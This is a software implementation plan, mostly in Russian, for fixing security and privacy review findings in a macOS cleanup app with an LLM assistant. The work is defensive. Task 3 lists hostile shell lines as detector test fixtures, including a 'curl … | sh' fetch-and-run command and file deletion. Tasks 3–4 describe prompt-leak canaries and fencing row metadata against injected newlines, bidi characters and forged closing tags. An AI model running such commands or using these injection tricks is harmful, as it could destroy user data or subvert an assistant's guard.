# Memory and Assistant Review Fixes Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Закрыть подтверждённые ошибки передачи ключей, приватности истории, prompt guard, состояния чата и диагностики памяти, сохранив ручное подтверждение всех действий.

**Architecture:** Сохранить существующие границы Memory / Assistant / App. На границах асинхронных операций фиксировать идентичность запроса и приложения; отделить отображаемую историю от безопасного сетевого представления; проверять все поля ответа одним guard. Изменения не добавляют ассистенту инструментов с побочными эффектами.

**Tech Stack:** Swift 6.0 strict concurrency, SwiftUI + Observation, Foundation/AppKit/Darwin, XCTest, Xcode 16.2, macOS 14 minimum.

**Spec:** [Отчёт ревью с доказательствами R01–R12/I01](../reviews/2026-10-04-memory-assistant-security-review.md); исходные [Memory spec](../specs/2026-10-02-memory-diagnostics-design.md), [Assistant spec](../specs/2026-10-02-cleanup-assistant-design.md), [Knowledge spec](../specs/2026-10-03-assistant-knowledge-base-design.md). Проверенная база: `091fa5a`.

## Global Constraints

- Xcode 16.2, Swift 6.0, macOS 14 minimum; no new third-party dependencies.
- Whitelist only; Trash only; preview before delete; `SafetyRules.isSafe(_:)` gates every delete call. Не расширять область удаления.
- Assistant never deletes or quits. Не ослаблять `AssistantIsolationTests`; список инструментов остаётся `list_items`, `item_details`, `propose_plan`, `lookup_knowledge`.
- Сохранить все четыре слоя guard: input refusal, data fencing, prompt-leak detection, code/command hiding. Fence — дополнительная защита, не гарантия поведения LLM.
- Никаких живых облачных запросов с пользовательскими данными и настоящих quit/force quit в автоматических регрессиях. Fake keys, fake clients, injected terminator, temporary conversation files.
- API-ключи не сохранять в истории, UserDefaults или логах. Alias → real-name map не сохранять и не отправлять.
- Сохранить русские UI-тексты, Debug-only license bypass, лимиты 4 tool rounds / 20 history messages / 150 history samples.
- Новые Swift-файлы зарегистрировать через `scripts/xcodeproj-add.py`; проверять и Xcode build, и domain runner.
- После каждого самостоятельного изменения — целевые тесты и отдельный commit. Исходный отчёт содержит нерешённые SmartCare test failures: не объявлять общий gate зелёным без полного успешного запуска.

## Review Focus

1. Сервер меняется во время ввода ключа или `await refreshContext`: запрос никогда не сочетает credential одного endpoint с другим. Задачи 1–2.
2. Опасный текст находится только в reason, имени файла, bare shell line либо в восстановленной истории: нельзя обойти guard/редактирование вторичным маршрутом. Задачи 3–5.
3. Приложение закрывается/перезапускается между подтверждениями; тот же PID больше не означает разрешённую цель. Задача 8.
4. Ответ прерывается до завершения, а исправленный план пуст: состояние после восстановления/финализации должно соответствовать последнему обмену. Задачи 6–7.
5. Системный API памяти не ответил: неизвестное нельзя превращать в ноль и положительный диагноз. Задача 9.

---

## Порядок и границы

| Этап | Задачи | Результат |
|---|---|---|
| A · P1 | 1, 2 | Ключи остаются у своего endpoint |
| B · P2 security/privacy | 3, 4, 5 | Guard покрывает все маршруты; история безопасна после рестарта |
| C · P2 correctness | 6, 7, 8, 9 | Устойчивые чат, планы, quit и измерения |
| D · verification | 10, 12 | Воспроизводимый тестовый и ручной release gate |
| E · improvements | 11, 13 | Владение Mach port; актуальные privacy roots |

Задачи 4–6 меняют модель сообщения/истории и выполняются последовательно. Задачи памяти независимы от Assistant. Задача 10 может выполняться раньше для восстановления domain runner. Задачи 11 и 13 не блокируют исправления P1; 13 меняет оговорённое в старой спецификации поведение и должна сопровождаться её обновлением.

### Task 1: Привязка ключа и результатов проверки к черновику настроек (R01, R10)

**Files:** создать `SpotlessMac/Assistant/AssistantSettingsEditor.swift`, `SpotlessMacTests/AssistantSettingsEditorTests.swift`; изменить `AssistantSettings.swift`, `SpotlessMac/App/AssistantSettingsCard.swift`, `SpotlessMac.xcodeproj/project.pbxproj`.

**Interfaces:** `AssistantEndpointIdentity: Equatable, Sendable` с `init(settings: AssistantSettings)`; для текущей политики identity = provider + нормализованный host, при некорректном URL — полный trimmed URL. `@Observable @MainActor AssistantSettingsEditor` владеет draft/key/models/status и методами `updateSettings(_:)`, `updateAPIKey(_:)`, `loadModels() async`, `check() async`, `reset()`. Сеть — injected closures тех же сигнатур, что `AssistantViewModel.fetchModels`/`checkConnection`; UI остаётся тонким.

- [x] Добавить `testUnsavedKeyDoesNotFollowAnotherHost`: saved A/key-A → B → key-B → C; fake check и models получают пустой ключ, подготовка Save тоже; возврат к A восстанавливает только key-A.
- [x] Добавить `testEditedDraftIgnoresLateProbeResult`: приостановить A, изменить provider/URL/model на B, закончить A; B не получает ни моделей A, ни зелёного статуса. Вторая операция должна побеждать первую и при обратном порядке ответов. Reset инвалидирует операции.
- [x] Запустить `scripts/test.sh AssistantSettingsEditorTests`, убедиться, что новые сценарии не проходят до реализации.
- [x] Реализовать привязку введённого ключа к identity, заменить Boolean `.onChange`. Результаты операций применять только при совпадении generation и снимка draft; изменения полей инвалидируют старый status. Каждый запрос берёт неизменяемые draft/key перед `await`.
- [x] Повторить тесты вместе с `AssistantSettingsTests LLMClientFactoryTests`; commit `e343594`.
- [ ] Вручную проверить изменение URL в поле без Save — GUI input blocked (`window_not_focused`); exact binding regression passes.

### Task 2: Атомарный контекст запроса (R02)

**Files:** изменить `SpotlessMac/Assistant/AssistantViewModel.swift`, `SpotlessMacTests/AssistantViewModelTests.swift`.

**Interfaces:** private `ResponseConfiguration { let settings: AssistantSettings; let apiKey: String }`; `respond(into: UUID, configuration: ResponseConfiguration) async`. Внешние Dependencies не расширяются.

- [x] Добавить `testSettingsChangeDuringRefreshDoesNotMixCredentials`: suspend refresh → сохранить B/key-B → resume; `makeClient` получает строго A/key-A. Следующий запрос получает B/key-B. При Stop во время refresh клиент не отправляет запрос.
- [x] Запустить `scripts/test.sh AssistantViewModelTests` и увидеть новую ошибку на текущем чтении key после `await`.
- [x] Читать settings и key синхронно в `startResponse`, передавать immutable configuration. Убрать повторное чтение key из `respond`; не логировать configuration.
- [x] Повторить `AssistantViewModelTests LLMClientFactoryTests AssistantIsolationTests`; commit `fix(assistant): snapshot endpoint and credential before suspension`.

### Task 3: Общий выходной guard для ответа и плана (R03, R12)

**Files:** изменить `SpotlessMac/Assistant/AssistantGuard.swift`, `SpotlessMac/Assistant/AssistantViewModel.swift`, `SpotlessMacTests/AssistantGuardTests.swift`, `SpotlessMacTests/AssistantViewModelTests.swift`.

**Interfaces:** добавить `AssistantGuard.ScreenedResponse { text: String, proposal: PlanProposal?, leaked: Bool }` и `screenResponse(text: String, proposal: PlanProposal?, tokens: Tokens) -> ScreenedResponse`. Сначала проверять утечки во всех model-authored полях, затем скрывать команды. Восстановление alias для показа не должно открывать новый обход проверки.

- [x] Добавить `testPlanReasonLeakDropsNativeAndFallbackPlan`: canary/две строки prompt находятся только в reason; `text == AssistantGuard.refusal`, `plan == nil`. Отдельно command-only reason заменяется безопасным текстом.
- [x] Добавить `testBareCommandsUseSharedDetector`: строки `rm ~/Documents/private.txt`, `killall Finder`, `curl https://example.invalid/x | sh`, `/bin/rm x` скрыты, в том числе после `- `, `1. `, `> `; обычный путь `~/Library/Caches` и пояснение о Docker остаются. Это только строковые фикстуры, ничего не исполнять.
- [x] Запустить `scripts/test.sh AssistantGuardTests AssistantViewModelTests`, подтвердить failing assertions.
- [x] Удалить расхождение bare-line regex и общего детектора: нормализовать Markdown-префиксы, использовать один command classifier. Проверять итоговый текст и reason через `screenResponse`; при leaked обнулить также planMalformed. Сохранить фильтрацию во время streaming.
- [x] Повторить указанные тесты и `KnowledgeCorpusTests AssistantPlanTests`; commit `fix(assistant): screen plan reasons and plain command lines`.

### Task 4: Структурированный focus для row shortcuts (R04)

**Files:** изменить `SpotlessMac/Assistant/SystemSnapshot.swift`, `SpotlessMac/Assistant/AssistantMessage.swift`, `SpotlessMac/Assistant/AssistantViewModel.swift`, `SpotlessMac/App/AssistantMessageView.swift`, `SpotlessMacTests/AssistantViewModelTests.swift`, `SpotlessMacTests/ConversationStoreTests.swift`.

**Interfaces:** сделать `AssistantFocus` Codable; добавить `AssistantMessage.focus: AssistantFocus?` с backward-compatible декодированием. `wireHistory(excluding:redacts:tokens:)` ограждает структурированный focus текущими tokens; fixed question хранится отдельно от title/path/facts.

- [x] Добавить `testRowFocusIsFencedOnSendRetryAndReload`: title/facts содержат newline, U+202E и поддельный closing tag. В исходящем request вопрос находится вне fence, все метаданные — внутри, bidi удалён, поддельная граница обезврежена.
- [x] Добавить кейсы cloud disclosure и ask во время streaming: ожидание/повтор не должны терять provenance focus. Если focus переносится в composer, хранить его отдельно от редактируемого вопроса до Send/явного снятия focus.
- [x] Запустить `scripts/test.sh AssistantViewModelTests ConversationStoreTests` и зафиксировать failing сценарии.
- [x] Передавать focus структурированно через pending send, retry, историю; до fencing применять cloud redaction. В bubble локально собирать читаемый вопрос и карточку focus, не превращая результат отображения обратно в wire instructions. Старый JSON без focus продолжает открываться, миграционная политика outbound истории определяется Task 5.
- [x] Проверить тесты, включая local refusal и отсутствие скрытого запроса у ненастроенного ассистента; commit `fix(assistant): preserve untrusted row context through conversation`.

### Task 5: Безопасная история после перезапуска (R11)

**Files:** изменить `SpotlessMac/Assistant/AssistantMessage.swift`, `SpotlessMac/Assistant/ConversationStore.swift`, `SpotlessMac/Assistant/AssistantViewModel.swift`, `SpotlessMac/Assistant/PathRedactor.swift`, тесты `ConversationStoreTests`, `PathRedactorTests`, `AssistantViewModelTests`; обновить §6 assistant-spec.

**Interfaces:** добавить optional `AssistantMessage.outboundSafeText: String?`, default nil для старого JSON. `text` остаётся локальным отображаемым текстом. Безопасное wire-представление фиксируется до `restore`; при replay alias старых сообщений получают отдельное пространство имён, например `<история-M-папка-N>` (M — UUID сообщения), которое не восстанавливается текущей alias map.

- [x] Добавить `testRestartDoesNotExposeRestoredProjectNames`: cloud answer с alias → persist → новая VM с пустым/другим снимком → новый запрос; ни одно wire message не содержит `secret-client`, исходный home или зарегистрированный secret root.
- [x] Добавить `testHistoricalAliasesCannotReferToNewSnapshotFolders`: старый и новый snapshot используют `<папка-1>` для разных папок; replay не смешивает идентичности. Проверить legacy JSON без safe text и переключение local → cloud.
- [x] Запустить `scripts/test.sh PathRedactorTests ConversationStoreTests AssistantViewModelTests`, подтвердить регрессии.
- [x] Разделить display и outbound text. Для off-device replay предпочитать только сохранённое безопасное представление; старую/локальную историю без доказуемо безопасного представления не пересылать автоматически, оставить её видимой и показать notice об ограниченном контексте. Не сохранять alias map. Новые user/focus сообщения получают safe representation при подготовке отправки; cloud model response — до восстановления имён.
- [x] Повторить тесты приватности, включая redaction в tool output и knowledge injection; commit `fix(assistant): persist a safe outbound conversation representation`.

Изменение политики legacy/local истории намеренное: сохранение контекста не должно раскрывать имена, которые приложение обещало скрывать. Новое поведение и notice описать в спецификации; не объявлять regex способным восстановить утраченную provenance.

### Task 6: Сохранение незавершённого обмена (R07; после Task 5)

**Files:** изменить `SpotlessMac/Assistant/AssistantViewModel.swift`, `SpotlessMacTests/AssistantViewModelTests.swift`, `SpotlessMacTests/ConversationStoreTests.swift`.

**Interfaces:** существующие `ConversationStore.save(_:)`/`load()` сохраняются. Private checkpoint helper использует `Dependencies.now` и интервал **1 секунда**, сохраняет screened display text и безопасное outbound представление вместе.

- [x] Добавить `testOpenStreamCanBeRestoredAsInterrupted`: fake stream не заканчивается; сразу после Send store содержит user + streaming placeholder; после checkpoint partial text восстанавливается, статус `.interrupted`, Retry доступен.
- [x] Добавить `testCheckpointCannotResurrectClearedConversation`: Новый диалог после partial text; поздний checkpoint/отмена старого ответа не возвращают сообщения. Проверить Stop до первого token.
- [x] Запустить целевые VM/store tests и подтвердить падение до исправления.
- [x] Сохранять начало обмена до запуска Task; checkpoint не чаще раза в секунду при поступлении текста, final/Stop сохранять немедленно. Не записывать raw transcript, tool arguments, canary или ключи в обход guard. Привязать checkpoint к message ID/generation.
- [x] Повторить VM/store/isolation tests; commit `fix(assistant): checkpoint in-flight conversations`.

### Task 7: Семантика замены плана (R08)

**Files:** изменить `SpotlessMac/Assistant/AssistantToolbox.swift`, `SpotlessMac/Assistant/AssistantViewModel.swift`, `SpotlessMacTests/AssistantToolboxTests.swift`, `SpotlessMacTests/AssistantViewModelTests.swift`.

**Interfaces:** `enum PlanUpdate: Equatable, Sendable { case unchanged; case replace(PlanProposal) }`; заменить неоднозначное `ToolOutcome.proposal` на `planUpdate`. Сохранить факт успешного native proposal отдельно от наличия meaningful card, чтобы пустая native замена не оживляла старый fallback.

- [x] Добавить `testEmptyNativeReplacementRemovesPreviousPlan`: c1 → валидный empty proposal → текст «План пуст»; итоговый `message.plan == nil`. Проверить также empty replacement + старый fallback block.
- [x] Добавить проверки nonempty → nonempty (последний побеждает), lookup после плана (не меняет), невалидный JSON (не считается успешной заменой).
- [x] Запустить `scripts/test.sh AssistantToolboxTests AssistantViewModelTests` и увидеть падение нового кейса.
- [x] Возвращать `.replace` для каждого успешно разобранного `propose_plan`, включая пустой; `.unchanged` для остальных инструментов и parse errors. Перед отображением разрешать только последнее предложение и применять Task 3 guard.
- [x] Повторить toolbox/VM/plan/isolation tests; commit `fix(assistant): honor empty replacement plans`.

### Task 8: Проверка экземпляра приложения перед завершением (R05)

**Files:** изменить `SpotlessMac/Memory/MemoryModels.swift`, `SpotlessMac/Memory/ProcessMemoryReader.swift`, `SpotlessMac/Memory/MemoryViewModel.swift`, `SpotlessMac/Memory/ProcessSafetyRules.swift`, `SpotlessMacTests/MemoryFixtures.swift`, `MemoryViewModelTests.swift`, `ProcessSafetyRulesTests.swift`.

**Interfaces:** `RunningAppIdentity: Equatable, Sendable { pid: pid_t, bundlePath: String, bundleIdentifier: String?, launchDate: Date }`; `RunningAppInfo.launchDate: Date?`. `AppTerminator` принимает проверенные identity вместо `[pid_t]`; live implementation сверяет identity у полученного `NSRunningApplication` перед terminate/forceTerminate. Если launch identity недоступна, действие запрещается с объяснением.

- [x] Добавить ordinary/force tests для PID reuse: после подтверждения Slack заменить PID42 на Finder; число вызовов terminator для replacement равно **0**. Повторить для нового экземпляра Slack с другой launchDate.
- [x] Проверить неизменившуюся разрешённую цель, уже закрытое приложение, недоступную identity и исчезновение между обычным quit и force offer. Сохранить существующие protected-app/UID проверки.
- [x] Запустить `scripts/test.sh MemoryViewModelTests ProcessSafetyRulesTests`, подтвердить падение reuse кейсов.
- [x] Захватывать vetted identities; live layer повторно сверяет bundle/launchDate непосредственно перед действием и использует тот же проверенный app object. Не заменять проверку существованием числового PID. Waiting отслеживает исходный экземпляр, а не его преемника.
- [x] Повторить целевые тесты и `AssistantIsolationTests`; commit `fix(memory): bind quit approval to application instance`.

### Task 9: Неизвестные показатели памяти (R06)

**Files:** изменить `SpotlessMac/Memory/MemoryModels.swift`, `SpotlessMac/Memory/SystemMemoryReader.swift`, `SpotlessMac/Memory/MemoryVerdict.swift`, `SpotlessMac/Memory/MemoryViewModel.swift`, `SpotlessMac/App/MemoryView.swift`, `SpotlessMac/App/CareDashboardView.swift`, `SpotlessMac/ViewModels/AssistantSnapshotBuilder.swift`, `SpotlessMac/Assistant/SystemSnapshot.swift`, `SpotlessMac/Assistant/SnapshotRenderer.swift`, `SpotlessMac/Assistant/ImprovementAdvisor.swift`; соответствующие `SystemMemoryReaderTests`, `MemoryVerdictTests`, `MemoryViewModelTests`, `SnapshotRendererTests`, `AssistantStagingTests` и fixtures.

**Interfaces:** добавить `MemoryMetricAvailability: Equatable, Sendable { pages: Bool, swap: Bool }` в `SystemMemorySnapshot` и переносить эти признаки в read-only `MemoryInfo` без ссылки на Memory API. Pressure `.unknown` уже существует. Числовые свойства сохранить для совместимости, но никогда не интерпретировать недоступные значения как измеренные. History points с недоступной метрикой должны создавать пробел соответствующего ряда.

- [x] Добавить независимые failure fixtures для pages/swap/pressure. Assert: unavailable fields отображаются/рендерятся как «—»/«данные не получены»; `.unknown` без достаточных свидетельств не даёт «Памяти достаточно».
- [x] Проверить нормальный pressure и настоящий swap=0; ненулевой достоверный swap/critical pressure при частично недоступных метриках не скрывают реальную нагрузку. История не рисует падение к нулю при ошибке.
- [x] Запустить memory/snapshot tests, подтвердить ошибки новых кейсов.
- [x] Сохранять availability в reader, применять её в verdict, UI, dashboard и assistant renderer/advisor. Добавить injectable pure conversion для nil pages/swap, чтобы тест не зависел от настоящего отказа sysctl. Уточнить противоречие спецификации «missing values become 0» против «show —».
- [x] Повторить memory/snapshot/staging tests и build; commit `fix(memory): distinguish unavailable metrics from zero`.

### Task 10: Восстановление domain runner и ясный test gate (R09)

**Files:** изменить `SpotlessMac/Assistant/AssistantMarkdownBlocks.swift`, `SpotlessMac/App/AssistantMarkdownView.swift`, `SpotlessMacTests/AssistantMarkdownBlocksTests.swift`; для расследования suite — `SpotlessMacTests/SmartCareLifecycleTests.swift`.

**Interfaces:** перенести чистую функцию в `AssistantMarkdownBlocks.inline(_ text: String) -> AttributedString`, View делегирует ей. Сохраняются emphasis и отсутствие активных ссылок.

- [x] Зафиксировать текущий fail: `python3 scripts/test-domain.py` → `cannot find 'AssistantMarkdownView' in scope`.
- [x] Перенести inline преобразование в domain-файл и обновить тест без исключений из runner. Проверки результата: `String(result.characters) == "сайт и важно"`, `result.runs.allSatisfy { $0.link == nil }`, strong emphasis сохранён.
- [x] Запустить полный domain runner, затем `scripts/test.sh AssistantMarkdownBlocksTests` и Debug build. Commit `fix(tests): keep markdown transformation tests in domain target`.
- [x] Отдельно воспроизвести `SmartCareLifecycleTests` с fake `sampleSpace`, чтобы убрать реальное измерение тома из lifecycle-тестов. Заменить лимит `1_000 Task.yield()` на завершение управляемой async-операции/expectation с явным тайм-аутом **5 секунд**. Не менять production license/cleanup поведение ради тестов.
- [x] Запустить изолированный lifecycle suite и полный Xcode suite. Если сбой остаётся, сохранить диагностические данные и расследовать фактический lifecycle; не списывать его на flaky без доказательств. Исправление тестовой синхронизации — отдельный commit.

### Task 11: Сбалансировать Mach host port (I01, P3)

**Files:** изменить `SpotlessMac/Memory/SystemMemoryReader.swift`.

**Interfaces:** `SystemMemoryReader.current()` остаётся прежним. В `readPages()` один локальный `host = mach_host_self()`, соответствующий `mach_port_deallocate(mach_task_self_, host)` через `defer` на всех путях выхода.

- [x] До изменения измерить user references через `mach_port_get_refs` вокруг 10 вызовов `current()` в отдельном временном probe; ожидать текущий прирост **10**.
- [x] Сбалансировать владение портом без изменения formulas/pressure/swap.
- [x] Повторить probe: ожидать нулевой прирост; `scripts/test.sh SystemMemoryReaderTests`. Постоянный live-тест счётчика в параллельный suite не добавлять: чужие замеры могут менять счётчик. Commit `fix(memory): release sampled host port send right`.

### Task 12: Спецификации и завершающая проверка

**Files:** изменить `AGENTS.md`, `docs/superpowers/specs/2026-10-02-cleanup-assistant-design.md`, `docs/superpowers/specs/2026-10-02-memory-diagnostics-design.md`, `docs/superpowers/plans/2026-10-02-cleanup-assistant-manual-checklist.md`; создать `docs/superpowers/specs/2026-10-04-assistant-security-contract.md`.

**Interfaces:** security contract с матрицей «источник → trust level → redaction → fencing → output guard → regression test». Не заявлять абсолютную jailbreak-защиту.

- [x] Согласовать tool/dependency counts с кодом, добавить правило 6 в AGENTS, описать новые identity/availability/history semantics и миграцию. Связать каждый R01–R12 с его тестом; I01 — с probe.
- [x] Запустить `python3 scripts/test-domain.py`, полный `scripts/test.sh`, Debug build. Зафиксировать SHA, среду, число тестов и результат; все gates должны пройти до заявления «готово к выпуску».
- [ ] Выполнить существующий manual checklist для Ollama Cloud/local/tool-less/LM Studio, дополнив переключением endpoint во время запроса, восстановлением истории, row focus и пустой заменой плана. Для облачных проверок использовать синтетические данные; не писать ключи в логи.
- [ ] На тестовом приложении без несохранённых документов проверить quit/force confirmation и сравнить показатели с Activity Monitor. Указать проверенные macOS версии, не распространять результат на непроверенные.
- [x] Сохранить evidence и обновить статусы checklist только для реально выполненных пунктов; commit `docs: reconcile assistant security and memory release checks`.

### Task 13: Актуальные корни обезличивания (улучшение после основных исправлений)

**Files:** изменить `SpotlessMac/App/ContentView.swift`, `SpotlessMac/Assistant/AssistantViewModel.swift`, `SpotlessMac/Assistant/PathRedactor.swift`, `SpotlessMacTests/PathRedactorTests.swift`, `AssistantViewModelTests.swift`, `AssistantIsolationTests.swift`, §6 assistant-spec.

**Interfaces:** добавить узкую read-only dependency `personalRootsProvider: @MainActor () -> [String]`; `PathRedactor.updateExtraRoots(_ roots: [String])` сохраняет уже выделенные alias. Обновить точный allowlist dependency labels в isolation-тесте, не его forbidden tokens.

- [x] Добавить `testNewProjectRootIsRedactedWithoutRestart`: создать VM, зарегистрировать `/Volumes/External/clients`, следующий fake cloud request не содержит root/client name. Старые alias остаются стабильными; удалённый root не раскрывает старую историю.
- [x] Запустить соответствующие тесты и подтвердить текущее отсутствие новых корней.
- [x] Обновлять набор roots перед подготовкой snapshot/history каждого ответа; получать только value data извне Assistant, не ссылку на registry/scan VM. Политику для удалённых корней выбрать консервативно: уже известные приватные names остаются скрытыми до нового диалога.
- [x] Повторить redaction/VM/isolation tests и обновить спецификацию, убрав «apply after next launch»; commit `fix(assistant): refresh privacy roots before requests`.

## Критерии готовности

- R01–R12 закрыты соответствующими проверками; ни один запрос не отправляет чужой ключ, восстановленные имена или unfenced row metadata.
- Guard одинаково работает для streaming text, финального текста и reason; пустая замена убирает прежний plan.
- Quit не касается нового владельца PID; недоступные показатели не изображают здоровую систему.
- Оба автоматических runner проходят полностью. Ручные проверки содержат фактические результаты и ограничения.
- Изменения в production-коде ещё не выполнялись: этот документ — план последующей реализации, не отчёт об исправлениях.


## Execution record (2026-10-04)

Code changes are implemented on `fix/memory-assistant-review` in `.worktrees/review-fixes`. [Verification report](../reviews/2026-10-04-memory-assistant-fixes-verification.md) is the source of actual test counts and pending live checks. Planned test names may differ where equivalent scenarios are combined; the security contract maps implemented names.

Independent units have separate commits. Tasks2–7/13 share response/history state and Codable/tool interfaces and were delivered together in `e1a18e3`, followed by planned coverage in `f6dde5f`; this avoids broken intermediate commits. Their individual reports/evidence remain in `.superpowers/sdd/2026-10-04-memory-assistant-review-fixes/`. Review caught additional safe-history retry, cancelled fallback, privacy-policy replay and alias overlap/migration cases; each was reproduced and corrected.

Manual provider GUI checks, disposable-app quit/force confirmation and Activity Monitor comparison remain unchecked. Automated gates do not imply release readiness on untested macOS versions or live cloud servers.
